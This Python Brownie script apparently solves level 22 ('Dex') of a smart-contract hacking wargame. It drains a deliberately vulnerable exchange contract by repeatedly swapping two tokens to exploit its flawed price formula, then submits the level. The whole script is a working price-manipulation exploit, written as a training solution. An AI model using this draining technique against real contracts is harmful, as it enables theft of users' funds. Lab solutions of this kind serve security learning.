from brownie import web3, Dex, interface

from scripts.helpful_scripts import (
    get_account,
    get_level_contract,
    submit_instance,
    print_out_if_level_solved,
)

LEVEL_NAME = "22_dex"
INTERFACE_CONTRACT = Dex
INSTANCE_VALUE_WEI = web3.toWei(0, "ether")
ACCOUNT = get_account()


def solve_level(level_contract):
    token1_address = level_contract.token1()
    token2_address = level_contract.token2()

    tx = level_contract.approve(
        level_contract, web3.toWei(1, "ether"), {"from": ACCOUNT}
    )
    print(
        "Contract allowance : "
        + str(interface.IERC20_0_6_0(token2_address).allowance(ACCOUNT, level_contract))
    )

    print_contract_balance(level_contract, token1_address, token2_address)

    (
        token1_account_balance,
        token2_account_balance,
        token1_dex_balance,
        token2_dex_balance,
    ) = get_current_values(level_contract, token1_address, token2_address)

    while token1_dex_balance > 0 and token2_dex_balance > 0:
        if token1_account_balance >= token2_account_balance:
            address_from = token1_address
            address_to = token2_address
            amount = token1_account_balance
        else:
            address_from = token2_address
            address_to = token1_address
            amount = token2_account_balance

        swap_amount = level_contract.get_swap_price(address_from, address_to, amount)
        to_balance = level_contract.balanceOf(address_to, level_contract)
        if to_balance < swap_amount:
            # swap_amount amount can't be larger than to_balance
            # amount = toBalance * fromBalance / toBalance
            amount = level_contract.balanceOf(address_from, level_contract)

        level_contract.swap(address_from, address_to, amount, {"from": ACCOUNT})
        (
            token1_account_balance,
            token2_account_balance,
            token1_dex_balance,
            token2_dex_balance,
        ) = get_current_values(level_contract, token1_address, token2_address)
        print_contract_balance(level_contract, token1_address, token2_address)


def get_current_values(level_contract, token1_address, token2_address):
    token1_account_balance = level_contract.balanceOf(token1_address, ACCOUNT.address)
    token2_account_balance = level_contract.balanceOf(token2_address, ACCOUNT.address)
    token1_dex_balance = level_contract.balanceOf(
        token1_address, level_contract.address
    )
    token2_dex_balance = level_contract.balanceOf(
        token2_address, level_contract.address
    )
    return (
        token1_account_balance,
        token2_account_balance,
        token1_dex_balance,
        token2_dex_balance,
    )


def print_contract_balance(level_contract, token1_address, token2_address):
    token1_account_balance = level_contract.balanceOf(token1_address, ACCOUNT.address)
    token2_account_balance = level_contract.balanceOf(token2_address, ACCOUNT.address)
    token1_dex_balance = level_contract.balanceOf(
        token1_address, level_contract.address
    )
    token2_dex_balance = level_contract.balanceOf(
        token2_address, level_contract.address
    )
    print(
        f"Token1 - account balance: {token1_account_balance} dex balance: {token1_dex_balance}"
    )
    print(
        f"Token2 - account balance: {token2_account_balance} dex balance: {token2_dex_balance}"
    )


# brownie run scripts/_22_dex.py --network rinkeby-fork
def main():
    level_contract = get_level_contract(
        LEVEL_NAME, INTERFACE_CONTRACT, INSTANCE_VALUE_WEI
    )
    solve_level(level_contract)
    level_solved = submit_instance(level_contract.address)
    print_out_if_level_solved(level_solved, LEVEL_NAME)
    return level_solved
